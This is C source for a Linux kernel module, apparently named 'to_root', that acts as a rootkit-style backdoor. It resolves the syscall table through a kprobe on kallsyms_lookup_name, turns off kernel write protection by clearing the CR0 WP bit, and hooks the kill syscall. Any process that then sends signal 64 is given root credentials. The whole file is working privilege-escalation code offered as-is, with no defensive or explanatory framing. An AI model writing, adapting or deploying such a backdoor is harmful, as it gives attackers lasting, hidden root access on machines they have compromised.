#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/unistd.h>
#include <linux/cred.h>
#include <linux/types.h>

#include <linux/string.h>

#include <asm/special_insns.h>
#include <asm/processor-flags.h>

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

//syscall table adr
uint64_t *syscall_table = 0;


typedef int (*sysfun_t)(struct pt_regs *);

//adr of original syscall kill
sysfun_t original_kill;

void root_me(void)
{
    struct cred * new_cred = prepare_creds();

    if(current->cred->uid.val==0)
    {
        return;
    }
    new_cred = prepare_creds();
    if (!new_cred)
    {
        return;
    }
    // change uid, gid to root id
    new_cred->uid.val = 0;
    new_cred->gid.val = 0;
    new_cred->euid.val = 0;
    new_cred->egid.val = 0;
    new_cred->fsuid.val = 0;
    new_cred->fsgid.val = 0;

    commit_creds(new_cred);
}

int kill_hook(struct pt_regs *regs){
    int status = (int)regs->si;

    if(status == 64){
    	root_me();
    }
    int rtn = original_kill(regs);

    return rtn;
}

void cr0_write(unsigned long val){
    asm volatile("mov %0,%%cr0"
		 : "+r"(val)
		 :
		 : "memory");
}

static inline unsigned long unprotect_memory(void){
    unsigned long cr0;
    unsigned long newcr0;

    cr0 = native_read_cr0();
    newcr0 = cr0 & ~(X86_CR0_WP);
    cr0_write(newcr0);
    return cr0;
}

static inline void protect_memory(unsigned long cr0){
    cr0_write(cr0);
}

int __init to_root_init(void) {

    /* Get syscall table adr */
    // Adr of syscall table -> kp.addr
    register_kprobe(&kp);

    typedef void *(*kallsyms_t)(const char *);
    kallsyms_t lookup_name;

    lookup_name = (kallsyms_t) (kp.addr);

    syscall_table = lookup_name("sys_call_table");

    /* Replace adr of original syscall with the hook function  */
    unsigned long old_cr0;
    old_cr0 = unprotect_memory();

    original_kill = (sysfun_t) syscall_table[__NR_kill];
    syscall_table[__NR_kill] = (uint64_t) kill_hook;
    
    protect_memory(old_cr0);

    return 0;
}

void __exit to_root_exit(void) {
    /* Replace the hook function with the adr of original syscall */
    unsigned long old_cr0;
    old_cr0 = unprotect_memory();

    syscall_table[__NR_kill] = original_kill;

    protect_memory(old_cr0);
    unregister_kprobe(&kp);
}

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Module to_root");
MODULE_AUTHOR("Author");

module_init(to_root_init);
module_exit(to_root_exit);
